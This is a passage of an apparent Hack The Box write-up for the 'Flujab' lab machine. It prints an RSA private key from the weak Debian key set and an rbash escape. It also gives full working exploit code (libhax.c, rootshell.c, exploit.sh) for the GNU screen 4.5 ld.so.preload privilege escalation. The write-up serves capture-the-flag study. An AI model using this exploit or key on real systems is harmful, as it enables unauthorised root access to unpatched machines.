<p><br><img src="/images/hackthebox/flujab/103.png" alt="" class="align-center"><br><br>
It matched this public key :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debian_ssh_rsa_4096_x86/rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub
</code></pre></div></div>
<p>So I grabbed the private key : <code class="language-plaintext highlighter-rouge">dead0b5b829ea2e3d22f47a7cbde17a6-23269</code> and used it to get ssh.<br>
<code class="language-plaintext highlighter-rouge">dead0b5b829ea2e3d22f47a7cbde17a6-23269</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
</code></pre></div></div>
<p><br><img src="/images/hackthebox/flujab/104.png" alt="" class="align-center"><br><br>
We owned user !</p>

<h2 id="bypassing-restricted-bash-local-privilege-escalation-vulnerability-in-screen-root-flag">Bypassing restricted bash, Local Privilege Escalation Vulnerability in screen, Root Flag</h2>
<p>After getting ssh access I found myself in <code class="language-plaintext highlighter-rouge">rbash</code> :
<br><img src="/images/hackthebox/flujab/105.png" alt="" class="align-center"><br><br>
After trying some stuff I could bypass it by adding the <code class="language-plaintext highlighter-rouge">-t</code> option when trying to ssh :
<code class="language-plaintext highlighter-rouge">ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@flujab.htb -t "bash --noprofile"</code>
<br><img src="/images/hackthebox/flujab/106.png" alt="" class="align-center"><br><br>
Then I had to fix my path :</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
</code></pre></div></div>
<p><br><img src="/images/hackthebox/flujab/107.png" alt="" class="align-center"><br><br>
I did some regular enumeration steps, one of them is searching for <code class="language-plaintext highlighter-rouge">suid</code> binaries :
<code class="language-plaintext highlighter-rouge">find / -perm -4000 2&gt;/dev/null</code>
<br><img src="/images/hackthebox/flujab/108.png" alt="" class="align-center"><br><br>
One thing that caught my attention was <code class="language-plaintext highlighter-rouge">/usr/local/share/screen/screen</code>
I checked the version of <code class="language-plaintext highlighter-rouge">screen</code> :
<code class="language-plaintext highlighter-rouge">screen -v</code> :
<br><img src="/images/hackthebox/flujab/109.png" alt="" class="align-center"><br><br>
It was version 4.5 which is vulnerable to a Local Privilege Escalation Vulnerability and there’s a published exploit for it <a href="https://www.exploit-db.com/exploits/41154" target="_blank" rel="noopener noreferrer">here</a>. However by looking at that exploit :
<br><img src="/images/hackthebox/flujab/110.png" alt="" class="align-center"><br><br>
We can see that it’s compiling stuff. And unfortunately <code class="language-plaintext highlighter-rouge">gcc</code> wasn’t installed on the machine :
<br><img src="/images/hackthebox/flujab/111.png" alt="" class="align-center"><br><br>
So I had to remove the <code class="language-plaintext highlighter-rouge">c</code> code from the exploit and create separate files. Then I compiled them.<br>
<code class="language-plaintext highlighter-rouge">libhax.c</code> :</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
</span><span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span>
<span class="kt">void</span> <span class="nf">dropshell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">chown</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">chmod</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
    <span class="n">unlink</span><span class="p">(</span><span class="s">"/etc/ld.so.preload"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">rootshell.c</code> :</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">execvp</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Compilation :
<br><code class="language-plaintext highlighter-rouge">gcc -fPIC -shared -ldl -o libhax.so libhax.c</code>
<br><code class="language-plaintext highlighter-rouge">gcc -o rootshell rootshell.c</code>
<br><br><code class="language-plaintext highlighter-rouge">exploit.sh</code> :</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash </span>
<span class="nb">cd</span> /etc
<span class="nb">umask </span>000
screen <span class="nt">-D</span> <span class="nt">-m</span> <span class="nt">-L</span> ld.so.preload <span class="nb">echo</span> <span class="nt">-ne</span>  <span class="s2">"</span><span class="se">\x</span><span class="s2">0a/tmp/libhax.so"</span> <span class="c"># newline needed</span>
<span class="nb">echo</span> <span class="s2">"[+] Triggering..."</span>
screen <span class="nt">-ls</span> 
/tmp/rootshell
</code></pre></div></div>
<p>I ran a python server to host the compiled binaries and the exploit script. Then I downloaded them on the machine :
<br><img src="/images/hackthebox/flujab/112.png" alt="" class="align-center"><br><br>
But when I ran the exploit it didn’t spawn a root shell :
<br><img src="/images/hackthebox/flujab/113.png" alt="" class="align-center"><br><br>
That’s because I forgot that the <code class="language-plaintext highlighter-rouge">suid</code> version of <code class="language-plaintext highlighter-rouge">screen</code> was in <code class="language-plaintext highlighter-rouge">/usr/local/share/screen/screen</code>. The other one had problems and didn’t even start :
<br><img src="/images/hackthebox/flujab/114.png" alt="" class="align-center"><br><br>
So I edited the path in the exploit code :</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash </span>
<span class="nb">cd</span> /etc
<span class="nb">umask </span>000
/usr/local/share/screen/screen <span class="nt">-D</span> <span class="nt">-m</span> <span class="nt">-L</span> ld.so.preload <span class="nb">echo</span> <span class="nt">-ne</span>  <span class="s2">"</span><span class="se">\x</span><span class="s2">0a/tmp/libhax.so"</span> <span class="c"># newline needed</span>
<span class="nb">echo</span> <span class="s2">"[+] Triggering..."</span>
/usr/local/share/screen/screen <span class="nt">-ls</span> 
/tmp/rootshell
</code></pre></div></div>
<p><br><img src="/images/hackthebox/flujab/116.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/help/">Hack The Box - Help</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/querier/">Hack The Box - Querier</a></p>

        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-06-15T07:00:00+02:00">June 15, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/pwn/bof/" class="pagination--pager" title="pwnable.kr - bof
">Previous</a>
    
    
      <a href="/hack-the-box/querier-2/" class="pagination--pager" title="Hack The Box - Querier (Commando)
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
